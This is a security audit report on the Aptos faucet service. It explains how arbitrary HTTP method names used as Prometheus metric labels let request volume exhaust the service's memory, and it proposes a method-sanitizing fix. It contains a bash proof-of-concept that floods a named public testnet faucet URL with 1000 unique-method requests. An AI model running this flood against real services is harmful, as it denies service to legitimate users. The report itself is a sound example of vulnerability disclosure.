# Audit Report

## Title
Unbounded Metric Label Cardinality via Arbitrary HTTP Methods Leading to Faucet Service Memory Exhaustion

## Summary
The Aptos Faucet service's metrics middleware uses unsanitized HTTP method names as Prometheus metric labels, allowing attackers to create unlimited unique time series by sending requests with arbitrary HTTP methods, leading to memory exhaustion and service crash.

## Finding Description

The faucet service records HTTP request metrics using three key metrics defined in the metrics middleware: [1](#0-0) 

The `HISTOGRAM` metric uses three labels: `method`, `operation_id`, and `status`. While `operation_id` is bounded to 5 hardcoded values and `status` is bounded to HTTP status codes, the `method` label is populated directly from the HTTP request without validation: [2](#0-1) 

This method string is later used as a metric label: [3](#0-2) 

The HTTP/1.1 specification allows arbitrary method tokens, and the underlying `poem`/`hyper` frameworks support custom HTTP methods beyond the standard GET, POST, etc. An attacker can send requests with unique method names:

```bash
curl -X "ATTACK_METHOD_00001" http://faucet/fund
curl -X "ATTACK_METHOD_00002" http://faucet/fund
# ... repeat with different method names
```

Each unique method creates a new Prometheus time series. The middleware processes all requests regardless of whether routes exist: [4](#0-3) 

The CORS configuration only restricts browser-based clients and doesn't prevent direct HTTP clients from using arbitrary methods: [5](#0-4) 

The codebase demonstrates awareness of metric cardinality issues. For example, the keyless pepper service explicitly sanitizes path labels to prevent cardinality explosion: [6](#0-5) 

However, even the pepper service uses unsanitized method names as labels: [7](#0-6) 

## Impact Explanation

This vulnerability constitutes **High Severity** per the Aptos Bug Bounty criteria, specifically falling under "API crashes" and "Validator node slowdowns" categories. 

The faucet service is critical infrastructure for the Aptos testnet and devnet ecosystems, enabling developers to obtain test tokens. A successful attack would:

1. **Exhaust memory** on the faucet service as Prometheus stores all time series in RAM
2. **Crash the faucet service** when memory limits are reached
3. **Prevent legitimate users** from obtaining test tokens
4. **Require manual intervention** to restart the service and potentially clear metric storage

The faucet metrics server monitors for high cardinality but only logs warnings after the fact: [8](#0-7) 

## Likelihood Explanation

The likelihood of this vulnerability being exploited is **HIGH**:

1. **Trivial to execute**: Requires only standard HTTP client tools (curl, wget, custom scripts)
2. **No authentication required**: Can attack public faucet endpoints
3. **No rate limiting on methods**: While the faucet may rate-limit requests per IP, each request with a unique method adds to cardinality
4. **Amplification effect**: A single attacker can generate thousands of unique method names rapidly
5. **Persistent impact**: Once created, time series persist in Prometheus until service restart or manual cleanup

The attack surface is maximized because the metrics are recorded for ALL requests, including those that result in 404, 405, or other error responses.

## Recommendation

Implement method name sanitization before using it as a metric label. Normalize all non-standard HTTP methods to a fixed label value:

```rust
// In crates/aptos-faucet/core/src/middleware/log.rs

fn sanitize_method(method: &str) -> &str {
    match method {
        "GET" | "POST" | "PUT" | "DELETE" | "PATCH" | "HEAD" | "OPTIONS" => method,
        _ => "OTHER",
    }
}

// Then in the Drop implementation:
HISTOGRAM
    .with_label_values(&[
        sanitize_method(self.request_log.method.as_str()),
        response_log.operation_id,
        response_log.response_status.to_string().as_str(),
    ])
    .observe(response_log.elapsed.as_secs_f64());
```

This approach is consistent with the cardinality protection already implemented for paths in the keyless pepper service.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Faucet Metric Cardinality Explosion Attack
# Prerequisites: Access to Aptos faucet endpoint and /metrics endpoint

FAUCET_URL="http://faucet.testnet.aptoslabs.com"
METRICS_URL="http://faucet.testnet.aptoslabs.com:9102/metrics"

echo "[*] Baseline metric check..."
BASELINE=$(curl -s $METRICS_URL | grep "aptos_tap_requests" | wc -l)
echo "[+] Baseline aptos_tap_requests time series: $BASELINE"

echo "[*] Launching cardinality explosion attack..."
for i in {1..1000}; do
    METHOD="ATTACK_METHOD_$(printf "%05d" $i)"
    curl -X "$METHOD" -s -o /dev/null "$FAUCET_URL/fund" &
    if [ $((i % 100)) -eq 0 ]; then
        echo "[+] Sent $i requests with unique methods"
    fi
done
wait

echo "[*] Post-attack metric check..."
sleep 5  # Allow metrics to update
AFTER=$(curl -s $METRICS_URL | grep "aptos_tap_requests" | wc -l)
echo "[+] Post-attack aptos_tap_requests time series: $AFTER"
echo "[!] Cardinality increased by: $((AFTER - BASELINE))"
echo "[!] Memory impact: Each time series uses ~3KB, total added: $((3 * (AFTER - BASELINE)))KB"
```

Expected behavior: The number of `aptos_tap_requests` time series increases proportionally to the number of unique HTTP methods sent, confirming unbounded cardinality growth.

## Notes

This vulnerability affects both the main faucet service and potentially the keyless pepper service, which uses the same pattern of unsanitized HTTP methods in metrics. The fix should be applied consistently across all services using HTTP method names as metric labels.

### Citations

**File:** crates/aptos-faucet/core/src/middleware/metrics.rs (L11-18)
```rust
pub static HISTOGRAM: Lazy<HistogramVec> = Lazy::new(|| {
    register_histogram_vec!(
        "aptos_tap_requests",
        "Tap requests latency grouped by method, operation_id and status.",
        &["method", "operation_id", "status"]
    )
    .unwrap()
});
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L32-32)
```rust
        method: request.method().to_string(),
```

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L133-139)
```rust
                HISTOGRAM
                    .with_label_values(&[
                        self.request_log.method.as_str(),
                        response_log.operation_id,
                        response_log.response_status.to_string().as_str(),
                    ])
                    .observe(response_log.elapsed.as_secs_f64());
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L175-180)
```rust
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L207-220)
```rust
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
        );
```

**File:** keyless/pepper/service/src/metrics.rs (L155-161)
```rust
    // Determine the request endpoint to use in the metrics (i.e., replace
    // invalid paths with a fixed label to avoid high cardinality).
    let request_endpoint = if is_known_path(request_endpoint) {
        request_endpoint
    } else {
        INVALID_PATH
    };
```

**File:** keyless/pepper/service/src/metrics.rs (L164-170)
```rust
    REQUEST_HANDLING_SECONDS
        .with_label_values(&[
            request_endpoint,
            request_method.as_str(),
            &response_code.to_string(),
        ])
        .observe(elapsed.as_secs_f64());
```

**File:** crates/aptos-faucet/metrics-server/src/gather_metrics.rs (L21-35)
```rust
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
    }
```
